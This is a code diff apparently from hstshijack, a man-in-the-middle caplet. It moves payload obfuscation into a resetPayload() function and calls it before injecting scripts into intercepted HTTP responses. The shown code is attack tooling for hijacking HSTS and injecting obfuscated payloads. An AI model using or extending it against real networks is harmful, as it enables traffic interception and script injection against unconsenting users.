@@ -84,6 +84,22 @@ function configure() {
 			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + custom_payload_path + ").")
 		}
 	}
+	// Check and generate core payload
+	resetPayload()
+	// Make sure specific target hosts are in SSL log
+	for (var i = 0; i < target_hosts.length; i++) {
+		target = target_hosts[i]
+		if ( !target.match(/^\*/) ) {
+			if ( ssl_log.indexOf(target) == -1 ) {
+				ssl_log.push(target)
+				writeFile( env("hstshijack.log"), ssl_log.join("\n") )
+				env("hstshijack.log") ? log_debug("(" + green + "hstshijack" + reset + ") Saved " + target + " to SSL log.") : ""
+			}
+		}
+	}
+}
+
+function resetPayload() {
 	if ( !readFile(payload_path) ) {
 		log_fatal("(" + green + "hstshijack" + reset + ") Could not read hstshijack.payload path (got " + payload_path + ").")
 	}
@@ -102,17 +118,6 @@ function configure() {
 	for (var i = 0; i < obfuscation_variables.length; i++) {
 		regexp = new RegExp(obfuscation_variables[i], "ig")
 		payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
-	}
-	// Make sure specific target hosts are in SSL log
-	for (var i = 0; i < target_hosts.length; i++) {
-		target = target_hosts[i]
-		if ( !target.match(/^\*/) ) {
-			if ( ssl_log.indexOf(target) == -1 ) {
-				ssl_log.push(target)
-				writeFile( env("hstshijack.log"), ssl_log.join("\n") )
-				env("hstshijack.log") ? log_debug("(" + green + "hstshijack" + reset + ") Saved " + target + " to SSL log.") : ""
-			}
-		}
 	}
 }
 
@@ -391,6 +396,7 @@ function onResponse(req, res) {
 			}
 		}
 		// Inject payload(s)
+		resetPayload()
 		if (custom_payloads.length > 0) {
 			for (var a = 0; a < custom_payloads.length; a++) {
 				custom_payload_host = custom_payloads[a].replace(/\:.*/, "")
